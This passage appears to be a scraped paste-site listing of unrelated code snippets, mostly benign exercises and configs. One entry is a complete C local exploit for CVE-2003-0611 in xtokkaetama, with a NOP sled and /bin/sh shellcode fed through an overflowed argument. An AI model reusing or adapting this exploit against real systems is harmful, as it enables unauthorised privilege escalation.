        <HeadingContainer>
          {subheading && <Subheading>{subheading}</Subheading>}
          {heading && <Heading>{heading}</Heading>}
        </HeadingContainer>
        {/* Heads */}
        <CardsContainer>
          {heads.map((card, index) => (
            <Card key={index} isHead={true} isLarge={index < 3}> {/* Update here for dynamic class application */}
              <div className=""card-image-background"">
                <CardImage imageSrc={card.imageSrc} isLarge={true} /> {/* Assume all heads are large */}
              </div>
              <CardContent>
                <span className=""position"">{card.position}</span>
                <span className=""name"">{card.name}</span>
                <CardLinks>
                  {card.links.map((link, linkIndex) => (
                    <a key={linkIndex} className=""link"" href={link.mail ? `mailto:${link.mail}` : link.url} target={link.mail ? ""_self"" : ""_blank""} rel=""noopener noreferrer"">
                      <link.icon className=""icon"" />
                    </a>
                  ))}
                </CardLinks>
              </CardContent>
            </Card>
          ))}
        </CardsContainer>
        {/* Assistant Heads */}
        <CardsContainer>
          {assistantHeads.map((card, index) => (
            <Card key={index}>
              <div className=""card-image-background"">
                <CardImage imageSrc={card.imageSrc} /> {/* Assistant heads use default size */}
              </div>
              <CardContent>
                <span className=""position"">{card.position}</span>
                <span className=""name"">{card.name}</span>
                <CardLinks>
                  {card.links.map((link, linkIndex) => (
                    <a key={linkIndex} className=""link"" href={link.mail ? `mailto:${link.mail}` : link.url} target={link.mail ? ""_self"" : ""_blank""} rel=""noopener noreferrer"">
                      <link.icon className=""icon"" />
                    </a>
                  ))}
                </CardLinks>
              </CardContent>
            </Card>
          ))}
        </CardsContainer>
      </ContentWithPaddingXl>
    </Container>
  );
};
 "
AFgD89wr,邀您一起看：熊掌,xiaomianao666,JavaScript,Wednesday 7th of February 2024 10:19:33 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥熊掌@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxhc3RfY2hhcHRlcl9ydWxlXCI6XCJcIixcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbe1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIuS6keWPo+S7pOWvvOWFpVwiLFwicGF0aFwiOlwiY2xvdWRpbXBvcnRcIixcInJ1bGVcIjpcImZ1bmN0aW9uIGNsb3VkaW1wb3J0KCkge1xcbiAgICBsZXQgcmVtb3RlZmlsZTtcXG4gICAgbGV0IGNmZ2ZpbGUgPSBcXFwiaGlrZXI6Ly9maWxlcy9ydWxlcy9TcmMvSnV5aW5nL2NvbmZpZy5qc29uXFxcIjtcXG4gICAgaWYgKGZpbGVFeGlzdChjZmdmaWxlKSkge1xcbiAgICAgICAgZXZhbChcXFwibGV0IEp1Y29uZmlnPVxcXCIgKyBmZXRjaChjZmdmaWxlKSArIFxcXCI7XFxcIik7XFxuICAgICAgICByZW1vdGVmaWxlID0gSnVjb25maWdbXFxcIuS+nei1llxcXCJdLm1hdGNoKC9odHRwKHMpPzpcXFxcL1xcXFwvLipcXFxcLy8pWzBdICsgJ1NyY0p5U2V0LmpzJztcXG4gICAgfVxcbiAgICBpZihyZW1vdGVmaWxlKXtcXG4gICAgICAgIHJlcXVpcmUocmVtb3RlZmlsZSk7XFxuICAgICAgICByZXR1cm4gSllpbXBvcnQoaW5wdXQpO1xcbiAgICB9ZWxzZXtcXG4gICAgICAgIHJldHVybiBcXFwidG9hc3Q6Ly/msqHmnInnlKjov4fogZrlvbHiiJrlsI/nqIvluo/vvJ9cXFwiO1xcbiAgICB9XFxufVxcbiQuZXhwb3J0cyA9IGNsb3VkaW1wb3J0KCk7XCJ9LHtcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJuYW1lXCI6XCLkvp3otZbmlofku7ZcIixcInBhdGhcIjpcImNvbmZpZ1wiLFwicnVsZVwiOlwianM6XFxuJC5leHBvcnRzLnZlcnNpb24gPSAxMTtcIn1dLFwicGFyYW1zXCI6XCJ7XFxcImlkXFxcIjpcXFwiYnV0dG9ubWVudTJcXFwifVwiLFwic2F2ZWRcIjpmYWxzZSxcInRpdGxlXCI6XCLogZrlvbHiiJpcIixcInZlcnNpb25cIjowLFwidXJsXCI6XCJoaWtlcjovL2VtcHR5IyNmeXBhZ2Ujbm9SZWNvcmRIaXN0b3J5IztnZXQ7VVRGLTg7e1VzZXItQWdlbnRATW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMO+8m++8myBXaW42NO+8m++8myB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMDUuMC4wLjAgU2FmYXJpLzUzNy4zNn1cIixcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJmaW5kX3J1bGVcIjpcImpzOihcXG4oKSA9PiB7XFxuICAgIHJlcXVpcmUoY29uZmlnLuS+nei1lik7XFxuICAgIGppZWtvdXlpamkoKTtcXG59XFxuKSgpXCIsXCJncm91cFwiOlwi4pGh5b2x6KeG4oiaXCIsXCJ1YVwiOlwicGNcIixcInByZVJ1bGVcIjpcImlmICghY29uZmlnLuS+nei1likge1xcbiAgICAvL+i/nOeoi+S+nei1lue0ouW8leaWh+S7tuS7o+eQhuWcsOWdgOWIl+ihqFxcbiAgICBsZXQgcmVxdWlyZWxpc3QgPSBbeyB1cmw6ICdodHRwczovL2docHJveHkubmV0L2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS8nLCBzb3J0OiAwIH0sIHsgdXJsOiAnaHR0cHM6Ly9naC5jb24uc2gvaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLycsIHNvcnQ6IDAgfSwgeyB1cmw6ICdodHRwczovL2dpdGh1Yi5qZXZvbnMudmlwL2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS8nLCBzb3J0OiAwIH1dXFxuICAgIGxldCByZXF1aXJlZmlsZSA9IFxcXCJoaWtlcjovL2ZpbGVzL3J1bGVzL1NyYy9yZXF1aXJlLmpzb25cXFwiO1xcbiAgICBpZiAoZmV0Y2gocmVxdWlyZWZpbGUpKSB7XFxuICAgICAgICB0cnkge1xcbiAgICAgICAgICAgIGV2YWwoXFxcInJlcXVpcmVsaXN0PVxcXCIgKyBmZXRjaChyZXF1aXJlZmlsZSkgKyBcXFwiO1xcXCIpO1xcbiAgICAgICAgfSBjYXRjaCAoZSkgeyB9XFxuICAgIH1cXG4gICAgcmVxdWlyZWxpc3Quc29ydChmdW5jdGlvbiAoeCwgeSkge1xcbiAgICAgICAgaWYgKHguc29ydCA8IHkuc29ydCkge1xcbiAgICAgICAgICAgIHJldHVybiAtMTtcXG4gICAgICAgIH0gZWxzZSBpZiAoeC5zb3J0ID4geS5zb3J0KSB7XFxuICAgICAgICAgICAgcmV0dXJuIDE7XFxuICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgIHJldHVybiAwO1xcbiAgICAgICAgfVxcbiAgICB9KTtcXG4gICAgZm9yIChsZXQgaSA9IDA7IGkgPCByZXF1aXJlbGlzdC5sZW5ndGg7IGkrKykge1xcbiAgICAgICAgdHJ5IHsgLy/ov5znqIvkvp3otZbntKLlvJVcXG4gICAgICAgICAgICByZXF1aXJlKHJlcXVpcmVsaXN0W2ldLnVybCArICdzcmM0ODU5Nzk2Mi9oay9tYXN0ZXIvcmVxdWlyZS5qcycsIHsgdGltZW91dDogMjAwMCB9KTtcXG4gICAgICAgICAgICBpZiAocmVseWZpbGUpIHtcXG4gICAgICAgICAgICAgICAgYnJlYWs7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfSBjYXRjaCAoZSkge1xcbiAgICAgICAgICAgIHJlcXVpcmVsaXN0W2ldLnNvcnQrKztcXG4gICAgICAgICAgICBsb2coZS5tZXNzYWdlKTtcXG4gICAgICAgIH1cXG4gICAgfVxcbiAgICB3cml0ZUZpbGUocmVxdWlyZWZpbGUsIEpTT04uc3RyaW5naWZ5KHJlcXVpcmVsaXN0KSk7XFxuICAgIGluaXRDb25maWcoe1xcbiAgICAgICAg5L6d6LWWOiByZWx5ZmlsZVxcbiAgICB9KTtcXG4gICAgbGV0IGNmZ2ZpbGUgPSBcXFwiaGlrZXI6Ly9maWxlcy9ydWxlcy9TcmMvSnV5aW5nL2NvbmZpZy5qc29uXFxcIjtcXG4gICAgaWYgKGZpbGVFeGlzdChjZmdmaWxlKSkge1xcbiAgICAgICAgdHJ5IHtcXG4gICAgICAgICAgICBldmFsKFxcXCJsZXQgSnVjb25maWc9XFxcIiArIGZldGNoKGNmZ2ZpbGUpICsgXFxcIjtcXFwiKTtcXG4gICAgICAgICAgICBKdWNvbmZpZ1tcXFwi5L6d6LWWXFxcIl0gPSByZWx5ZmlsZTtcXG4gICAgICAgICAgICB3cml0ZUZpbGUoY2ZnZmlsZSwgSlNPTi5zdHJpbmdpZnkoSnVjb25maWcpKTtcXG4gICAgICAgIH0gY2F0Y2ggKGUpIHsgfVxcbiAgICB9XFxufVxcbi8vYnku5biF4oiaYOS6uuaJjSDogZrlvbHmqKHmnb/vvIFcIixcInBhZ2VzXCI6XCJbe1xcXCJjb2xfdHlwZVxcXCI6XFxcIm1vdmllXzNcXFwiLFxcXCJuYW1lXFxcIjpcXFwi5LqR5Y+j5Luk5a+85YWlXFxcIixcXFwicGF0aFxcXCI6XFxcImNsb3VkaW1wb3J0XFxcIixcXFwicnVsZVxcXCI6XFxcImZ1bmN0aW9uIGNsb3VkaW1wb3J0KCkge1xcXFxuICAgIGxldCByZW1vdGVmaWxlO1xcXFxuICAgIGxldCBjZmdmaWxlID0gXFxcXFxcXCJoaWtlcjovL2ZpbGVzL3J1bGVzL1NyYy9KdXlpbmcvY29uZmlnLmpzb25cXFxcXFxcIjtcXFxcbiAgICBpZiAoZmlsZUV4aXN0KGNmZ2ZpbGUpKSB7XFxcXG4gICAgICAgIGV2YWwoXFxcXFxcXCJsZXQgSnVjb25maWc9XFxcXFxcXCIgKyBmZXRjaChjZmdmaWxlKSArIFxcXFxcXFwiO1xcXFxcXFwiKTtcXFxcbiAgICAgICAgcmVtb3RlZmlsZSA9IEp1Y29uZmlnW1xcXFxcXFwi5L6d6LWWXFxcXFxcXCJdLm1hdGNoKC9odHRwKHMpPzpcXFxcXFxcXC9cXFxcXFxcXC8uKlxcXFxcXFxcLy8pWzBdICsgJ1NyY0p5U2V0LmpzJztcXFxcbiAgICB9XFxcXG4gICAgaWYocmVtb3RlZmlsZSl7XFxcXG4gICAgICAgIHJlcXVpcmUocmVtb3RlZmlsZSk7XFxcXG4gICAgICAgIHJldHVybiBKWWltcG9ydChpbnB1dCk7XFxcXG4gICAgfWVsc2V7XFxcXG4gICAgICAgIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v5rKh5pyJ55So6L+H6IGa5b2x4oia5bCP56iL5bqP77yfXFxcXFxcXCI7XFxcXG4gICAgfVxcXFxufVxcXFxuJC5leHBvcnRzID0gY2xvdWRpbXBvcnQoKTtcXFwifSx7XFxcImNvbF90eXBlXFxcIjpcXFwibW92aWVfM1xcXCIsXFxcIm5hbWVcXFwiOlxcXCLkvp3otZbmlofku7ZcXFwiLFxcXCJwYXRoXFxcIjpcXFwiY29uZmlnXFxcIixcXFwicnVsZVxcXCI6XFxcImpzOlxcXFxuJC5leHBvcnRzLnZlcnNpb24gPSAxMTtcXFwifV1cIn0iLCJwaWNVcmwiOiJodHRwczovL2hpa2VyZmFucy5jb20vdHViaWFvL21vcmUvMTA1LnBuZyIsInRpdGxlIjoi54aK5o6MIn0=
0tD6ivJ0,邀您一起看：仙府御兽,xiaomianao666,JavaScript,Wednesday 7th of February 2024 10:15:46 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥仙府御兽@@
ha8Bnm5z,"Break, continue e pass em Python",jacknpoe,Python,Wednesday 7th of February 2024 09:42:11 AM CDT,"# break
def exemplo_break(numero):
    for temp in range(1,numero):
        if temp == 5:
            break
        print(temp)


# continue
def exemplo_continue(numero):
    for temp in range(1,numero):
        if temp == 5:
            continue
        print(temp)


#pass
def exemplo_pass(numero):
    for temp in range(1,numero):
        if temp % 2:
            pass
        else:
            print(temp)


# Main
if __name__ == '__main__':
    exemplo_break(10)
    exemplo_continue(10)
    exemplo_pass(10)
"
Wgnsb83i,casino.lua,Meaxis,Lua,Wednesday 7th of February 2024 09:24:23 AM CDT,"local itemValues = { 
	[""minecraft:diamond""] = 1
}

current_line = 0
monitor = peripheral.find(""monitor"")
monitor.setTextScale(0.5)

function Split(s, delimiter)
    result = {};
    for match in (s..delimiter):gmatch(""(.-)""..delimiter) do
        table.insert(result, match);
	end
        
	return result;
end

local function centerText(text)
	current_line = current_line + 1
	monitor.setCursorPos(0,current_line)

	local trueStr = """"
	for i, v in pairs(Split(text, ""<clr>"")) do
    	if i%2 == 1 then
        	trueStr = trueStr..v
    	end
	end

	local shouldContinue = false
	for i, v in pairs(Split(text, ""<clr>"")) do
    	if i%2 == 1 then
        	monitor.write(v)
    	else
        	term.setTextColor(colors[v])
    	end
	end
end

function runWelcome()
	term.clear()

	local chest_contents = {peripheral.find(""inventory"")}
	chest_contents = chest_contents[1].list()
	local totalValue = 0

	for i, v in pairs(chest_contents) do
		totalValue = totalValue + (itemValues[v['name']] or 0)
	end

	centerText(""- <clr>orange<clr>=<clr>yellow<clr>=<clr>red<clr>! <clr>yellow<clr>CASINO <clr>red<clr>!<clr>yellow<clr>=<clr>orange<clr>= -"")
	monitor.setTextColor(colors.yellow)
	centerText(""> <clr>blue<clr>Your bet: <clr>cyan<clr>""..tostring(totalValue))
	centerText(""<clr>green<clr>To get started"")
	centerText(""<clr>lime<clr>press the button"")
end

runWelcome()
"
czUnayX0,RAGDOLL Pressing KEY in Roblox Studio. LOCALSCRIPT,Joriangames,Lua,Wednesday 7th of February 2024 09:19:48 AM CDT,"-- RAGDOLL with PRESSING KEY by BLOXIANCODE youtube.com/c/BloxianCode
-- Tutorial: https://youtu.be/zycVpt-ClEQ

local UIS = game:GetService(""UserInputService"")
local RepStor = game.ReplicatedStorage
local isRagdoll = false

UIS.InputBegan:Connect(function(key, inChat)
	if inChat then return end
	if key.KeyCode == Enum.KeyCode.R then --if player pressed R
		if not isRagdoll then
			RepStor.RagdollEvent:FireServer(""go"")
			wait(.5)
			isRagdoll = true
		else
			RepStor.RagdollEvent:FireServer(""stop"")
			wait(.5)
			isRagdoll = false
		end
	end
end)
"
ZLXDP6ZA,RAGDOLL Pressing KEY in Roblox Studio. SCRIPT,Joriangames,Lua,Wednesday 7th of February 2024 09:18:14 AM CDT,"-- RAGDOLL with PRESSING KEY by BLOXIANCODE youtube.com/c/BloxianCode
-- Tutorial: https://youtu.be/zycVpt-ClEQ

local RagdollEvent = game.ReplicatedStorage.RagdollEvent

RagdollEvent.OnServerEvent:Connect(function(player, input)
	if input == ""go"" then
		for i, v in pairs(player.Character:GetDescendants()) do
			if v:IsA(""Motor6D"") and v.Parent.Name ~= ""HumanoidRootPart"" then
				local Socket = Instance.new(""BallSocketConstraint"")
				local a1 = Instance.new(""Attachment"")
				local a2 = Instance.new(""Attachment"")
				a1.Parent = v.Part0
				a2.Parent = v.Part1
				Socket.Parent = v.Parent
				Socket.Attachment0 = a1
				Socket.Attachment1 = a2
				a1.CFrame = v.C0
				a2.CFrame = v.C1
				Socket.LimitsEnabled = true
				Socket.TwistLimitsEnabled = true
				v:Destroy()
			end
		end
		player.Character.Humanoid.RequiresNeck = false
		player.Character.Humanoid.Sit = true
		
	else
		
		for i,v in pairs(player.Character:GetDescendants()) do
			if v:IsA(""BallSocketConstraint"") then
				v.UpperAngle = 0
				v.TwistUpperAngle = 0
				v.TwistLowerAngle = 0
				local Joints = Instance.new(""Motor6D"",v.Parent)
				Joints.Part0 = v.Attachment0.Parent
				Joints.Part1 = v.Attachment1.Parent
				Joints.C0 = v.Attachment0.CFrame
				Joints.C1 = v.Attachment1.CFrame
				v:Destroy()
			end
		end
		player.Character.Humanoid.Sit = false
	end
end)"
HxVbYpY8,Untitled,dvjsharma,YAML,Wednesday 7th of February 2024 09:12:42 AM CDT,"name: Swagger API Updated

on:
  pull_request:
    branches: [ ""main"" ]
  workflow_dispatch:

jobs:

  doc-diff:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v3

    - name: Set up Go
      uses: actions/setup-go@v4
      with:
        go-version: '1.20'
        check-latest: true
        cache: true

    - name: Install swag
      run: |
        go install github.com/swaggo/swag/cmd/swag@latest

    - name: Build Swagger documents
      run: |
        swag init --generalInfo api.go --dir ./pkg/api,./pkg/auth,./pkg/db,./pkg/models,./pkg/utils --output ./swag/docs

    - name: Check doc diff
      run: |
        diff swag/docs/docs.go cmd/laas/docs/docs.go > swagger-diff.txt
        # Check if file swagger-diff.txt is empty
        if [ -s swagger-diff.txt ]
        then
          # If file is not empty, echo a message and exit 1
          echo ""Swagger docs are not up to date. Please run 'swag init' and commit the changes.""
          exit 1
        fi

  doc-fmt:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Set up Go
        uses: actions/setup-go@v4
        with:
          go-version: '1.20'
          check-latest: true
          cache: true

      - name: Install swag
        run: |
          go install github.com/swaggo/swag/cmd/swag@latest

      - name: Format Swagger documents
        run: |
          swag fmt --generalInfo ./pkg/api/api.go --dir ./pkg/api,./pkg/auth,./pkg/db,./pkg/models,./pkg/utils

      - name: Check file diff
        run: |
          git diff --exit-code"
SJpVw8mn,Manage godotenv,Justman10000,Bash,Wednesday 7th of February 2024 09:11:05 AM CDT,"// To install
# You need Go (https://pastebin.com/qFQRy0FX)

mkdir /home/godotenv
cd /home/godotenv
git init
git pull https://github.com/joho/godotenv
cd cmd/godotenv
go build -o godotenv
mv godotenv /usr/bin
rm -r /home/godotenv

// To uninstall
rm -r /usr/bin/godotenv"
HksDPytp,xtokkaetama 1.0b (RedHat 9.0) - Local Game - CVE-2003-0611,FlyFar,C,Wednesday 7th of February 2024 08:52:14 AM CDT,"/*
*  xtokkaetama 1.0b local game exploit on Red Hat 9.0
*               Coded by brahma (31/07/2003)
*
*       http://www.debian.org/security/2003/dsa-356
*/


#include <stdlib.h>
#define RETADDR 0xbfffff11 
#define DEFAULT_BUFFER_SIZE 29
#define DEFAULT_EGG_SIZE 512 
#define NOP 0x90
#define BIN ""/usr/X11R6/bin/xtokkaetama"" 
char shellcode[] =
""\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b""
""\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd""
""\x80\xe8\xdc\xff\xff\xff/bin/sh"";

unsigned long get_esp(void) {
__asm__(""movl %esp,%eax"");
}

void main(int argc, char *argv[]) {
char *buff, *ptr, *egg;
long *addr_ptr, addr;
int bsize=DEFAULT_BUFFER_SIZE;
int i, eggsize=DEFAULT_EGG_SIZE;

if (argc > 1) bsize = atoi(argv[1]);
if (argc > 2) eggsize = atoi(argv[2]);


if (!(buff = malloc(bsize))) {
printf(""Can't allocate memory.\n"");
exit(0);
}
if (!(egg = malloc(eggsize))) {
printf(""Can't allocate memory.\n"");
exit(0);
}

addr = RETADDR; 
printf(""Using address: 0x%x\n"", addr);

ptr = buff;
addr_ptr = (long *) ptr;
for (i = 0; i < bsize; i+=4)
*(addr_ptr++) = addr;

ptr = egg;
for (i = 0; i < eggsize - strlen(shellcode) - 1; i++)
*(ptr++) = NOP;

for (i = 0; i < strlen(shellcode); i++)
*(ptr++) = shellcode[i];

buff[bsize - 1] = '\0';
egg[eggsize - 1] = '\0';

memcpy(egg,""EGG="",4);
putenv(egg);
execl(BIN,BIN,""-display"",buff,NULL);
}



// milw0rm.com [2003-08-01]
            "
X0FwTvyj,Untitled,Farz0l1x,Python,Wednesday 7th of February 2024 08:29:24 AM CDT,"def pov(A):
    P = []
    n = 0
    for i in range(1, len(A)):
        if A[i] == A[i-1]:
            n = A[i]
            break
        
        
    if n != 0:
        for j in range(len(A)):
            if A[j] == n:
                P.append(A[i])
            if len(P) == 3 and len(set(A)) - len(P) == 0:
                return n
            else:
                return False
    else:
        return False
file = open(""in.txt"")
count = 0
N = []
for elem in file:
    A = list(map(int, elem.split()))
    n = 0
    A.sort()
    if pov(A) != False:
        for i in range(len(A)):
            if A[i] != pov(A):
                N.append(A[i])
    if sum(N) / 3 <= pov(A) * 3:
        count += 1
print(count)"
5tqpPG34,16 (рекурсия,nq1s788,Python,Wednesday 7th of February 2024 08:26:40 AM CDT,"def f(n):
    if n == 1:
        return 1
    if n > 1:
        return 5 * f(n - 1) + 3 * n


print(f(4))"
eS5kpmUU,FNAF1,ERROR_CODE,Lua,Wednesday 7th of February 2024 08:23:14 AM CDT,"game:GetObjects(""rbxassetid://16275693682"")[1].Parent = game.Workspace"
mEXrD5pH,Arrays_P4,nathaditya,C++,Wednesday 7th of February 2024 07:34:30 AM CDT,"vector<int> Solution::repeatedNumber(const vector<int> &A) {
    vector<int> copy(A.size()+1, 0);
    copy[0] = 1;
    vector<int> ans;
    for(int i = 0; i < A.size(); i++){
        copy[A[i]]++;
        if(copy[A[i]] > 1)
            ans.push_back(A[i]);
    }
    
    auto itr = find(copy.begin(), copy.end(), 0);
    ans.push_back(itr - copy.begin());
    return(ans);
}
"
23emJec3,Untitled,cepxuozab,C++,Wednesday 7th of February 2024 07:30:32 AM CDT,"#include <iostream>
#include <string>

std::string perform()
{
	std::string str;
	getline(std::cin, str);
	std::string tmp;
	for (char ch : str) {
		if (ch == '+' || isdigit(ch) != 0) {
			tmp += ch;
		}
	}
	if (tmp.front() == '+') {
		tmp = tmp.substr(2);
		tmp = ""8"" + tmp;
	}
	if (tmp.size() == 7U) {
		tmp = ""8495"" + tmp;
	}
	return tmp;
}

int main() {
	std::string one=perform()
		, two = perform()
		, three = perform()
		, four = perform();
	two == one ? puts(""YES"") : puts(""NO"");
	three == one ? puts(""YES"") : puts(""NO"");
	four == one ? puts(""YES"") : puts(""NO"");

}"
Uyt2GL0y,kill_thread.py,DrAungWinHtut,Python,Wednesday 7th of February 2024 07:27:33 AM CDT,"import threading
import time

exit_event1 = threading.Event()
exit_event2 = threading.Event()

def print_numbers(thread_no, exit_event):
    i = 0
    while not exit_event.is_set():
        i += 1
        time.sleep(1)
        print(f'Thread no. {thread_no} - i = {i}')

# Create threads
thread1 = threading.Thread(target=print_numbers, args=(1, exit_event1), name='Thread 1')
thread2 = threading.Thread(target=print_numbers, args=(2, exit_event2), name='Thread 2')

# Start the threads
thread1.start()
thread2.start()

# Wait for user input
while True:
    key = input('Press 1 to exit Thread 1, 2 to exit Thread 2, q to quit: ')
    
    if key == '1':
        exit_event1.set()
        thread1.join()  # Wait for Thread 1 to finish
        
    elif key == '2':
        exit_event2.set()
        thread2.join()  # Wait for Thread 2 to finish
        
    elif key.lower() == 'q':
        exit_event1.set()  # Signal both threads to exit
        exit_event2.set()
        thread1.join()  # Wait for both threads to finish
        thread2.join()
        
    else:
        print(""Invalid input. Try again."")
"
vANB3x3R,Untitled,Farz0l1x,Python,Wednesday 7th of February 2024 07:18:48 AM CDT,"def ravn(A):
    count = 0
    for i in range(1, len(A)):
        if A[i] == A[i-1]:
            count += 1
    return count
        
file = open(""in.txt"")
count = 0
for elem in file:
    A = list(map(int, elem.split()))
    A.sort()
    if (A[3] < A[0] + A[1] + A[2]) and (ravn(A) == 1):
        count += 1
print(count)"
nXwX8B0y,Untitled,Farz0l1x,Python,Wednesday 7th of February 2024 07:13:51 AM CDT,"file = open(""in.txt"")
count = 0
for elem in file:
    A = list(map(int, elem.split()))
    A.sort()
    if (A[3]**3 >= 2 * A[0] * A[1] * A[2]) and (A[0] > 10 and A[1] > 10 and A[2] > 10 and A[3] > 10):
        count += 1
print(count)"
cRunA9GK,Untitled,Farz0l1x,Python,Wednesday 7th of February 2024 07:11:12 AM CDT,"file = open(""in.txt"")
count = 0
for elem in file:
    A = list(map(int, elem.split()))
    A.sort()
    if (A[3] - A[0] >= 50) and (A[1] * A[2] <= 1000):
        count += 1
print(count)"
z12GJXLB,Untitled,Farz0l1x,Python,Wednesday 7th of February 2024 07:09:23 AM CDT,"file = open(""in.txt"")
count = 0
for elem in file:
    A = list(map(int, elem.split()))
    A.sort()
    if (A[0] * A[1] == A[2] * A[3] or A[0] * A[2] == A[1] * A[3] or A[0] * A[3] == A[1] * A[2]) and (A[2]**2 > A[0] * A[3]):
        count += 1
print(count)"
pWyRR3Vr,Untitled,Farz0l1x,Python,Wednesday 7th of February 2024 07:06:50 AM CDT,"file = open(""in.txt"")
count = 0
for elem in file:
    A = list(map(int, elem.split()))
    A.sort()
    if (A[0] + A[1] == A[2] + A[3] or A[0] + A[2] == A[1] + A[3] or A[0] + A[3] == A[1] + A[2]) and (A[3] - A[0] < (A[2] + A[1]) - A[3]):
        count += 1
print(count)"
sPn06d5j,Untitled,InfSub,JavaScript,Wednesday 7th of February 2024 07:03:18 AM CDT,"
/system package update set channel=long-term

/system identity
set name=$varIdentity

### Disabled packages ###
:if ( ![ /system package get hotspot disabled ] ) do={ /system package disable hotspot };
:if ( ![ /system package get ipv6 disabled ] ) do={ /system package disable ipv6 };
:if ( ![ /system package get mpls disabled ] ) do={ /system package disable mpls };
:if ( ![ /system package get ppp disabled ] ) do={ /system package disable ppp };
:if ( ![ /system package get routing disabled ] ) do={ /system package disable routing };

/interface bridge
add name=bridge-LAN

:global varAdminMACLan [/interface bridge get [find name=""bridge-LAN""] mac-address];

/interface bridge
set bridge-LAN admin-mac=$varAdminMACLan auto-mac=no add-dhcp-option82=yes dhcp-snooping=yes

/interface ethernet
set [ find default-name=ether1 ] loop-protect=on name=ether1 comment=""LAN-01"""
HBS58Bgm,Untitled,Farz0l1x,Python,Wednesday 7th of February 2024 07:00:45 AM CDT,"file = open(""in.txt"")
count = 0
for elem in file:
    A = list(map(int, elem.split()))
    A.sort()
    if (A[-1] < A[0] + A[1] + A[2]) and (A[0] + A[1] == A[2] + A[3] or A[0] + A[2] == A[1] + A[3] or A[0] + A[3] == A[1] + A[2]):
        count += 1
print(count)"
hNyPTp9S,Untitled,Farz0l1x,Python,Wednesday 7th of February 2024 06:55:46 AM CDT,"file = open(""in.txt"")
count = 0
for elem in file:
    A = list(map(int, elem.split()))
    A.sort()
    if (A[0] + A[-1]) ** 2 > (A[1] + A[2])** 2:
        count +=1
print(count)"
Zg1QHHa5,Untitled,Farz0l1x,Python,Wednesday 7th of February 2024 06:52:29 AM CDT,"file = open(""in.txt"")
count = 0
for elem in file:
    A = list(map(int, elem.split()))
    A.sort()
    if A[-1] ** 2 > 2 * A[0] * A[1]:
        count += 1
print(count)"
23PXrggm,Untitled,Farz0l1x,Python,Wednesday 7th of February 2024 06:48:40 AM CDT,"file = open(""in.txt"")
count = 0
for elem in file:
    A = list(map(int, elem.split()))
    A.sort()
    print(A)
    if A[0] + A[-1] < A[1] + A[2]:
        count += 1
print(count)"
7envPjhR,Untitled,Farz0l1x,Python,Wednesday 7th of February 2024 06:44:49 AM CDT,"file = open(""in.txt"")
count = 0
for elem in file:
    A = list(map(int, elem.split()))
    A.sort()
    if (A[0] * A[-1]) / 2 <= A[1]:
        count += 1
print(count)"
fiZwUVpU,Untitled,shmooafo,YAML,Wednesday 7th of February 2024 06:22:30 AM CDT,"##### HARDWARE CONFIGURATION #####
# project: TV IR Remote and Buzzer @ livingroom
# board: d1_mini
# pins:
#   D3 - IR transmitter
#   D4 - IR receiver
#   D5 - buzzer

substitutions:
  device_name: ""esptvremote""
  device_friendly_name: ""ESP Television Remote""
  device_description: ""TV Remote and Buzzer""
  device_area: ""livingroom""

  ### LG IR codes
  LG_nbits: ""32""
  LG_power: ""0x20DF10EF""
  # LG_volup: ""0x20DF40BF""
  # LG_voldn: ""0x20DFC03F""
  # LG_chup: ""0x20DF00FF""
  # LG_chdn: ""0x20DF807F""
  # LG_mute: ""0x20DF906F""
  # LG_tvrad: ""0x20DF0FF0""
  # LG_NETFLIX: ""0x20DF40BF""

packages:
  base: !include .base.yaml
  base_d1: !include .base.d1mini.yaml
  snippet__rtttlbuzzer: !include .snippet.rtttlbuzzer.yaml

# logger:
#   level: debug

#############################

remote_receiver:
  pin:
    number: D4
    inverted: true
  on_lg:
    - homeassistant.event:
        event: esphome.rf_code.lg
        data:
          # code: !lambda return x.data;
          code: !lambda |-
            static char buffer[2+8+1];
            snprintf(buffer, sizeof(buffer), ""0x%08X"", x.data); // uint32_t
            return buffer;
          # function: !lambda |-
          #   auto it = id(lg_codes).find(x.data);
          #   return (it!=id(lg_codes).end()) ? 
          #     id(lg_codes)[x.data] : 
          #     std::string();
    - if:
        condition:
          switch.is_on: switch_remoterf_debug
        then:
          - lambda: |-
              ESP_LOGI(""app"", ""Received LG: data=0x%08X, nbits=%d"", x.data, x.nbits);

switch:
  - platform: template
    name: ""Remote RF Debug""
    id: switch_remoterf_debug
    icon: mdi:bug-play
    optimistic: true
    entity_category: diagnostic

binary_sensor:
  - platform: remote_receiver
    name: ""LG Power""
    icon: mdi:remote-tv
    lg:
      data: ${LG_power}
      nbits: ${LG_nbits}
  # - platform: remote_receiver
  #   name: ""Volume Up""
  #   icon: mdi:remote-tv
  #   lg:
  #     data: ${LG_volup}
  #     nbits: ${LG_nbits}
  # - platform: remote_receiver
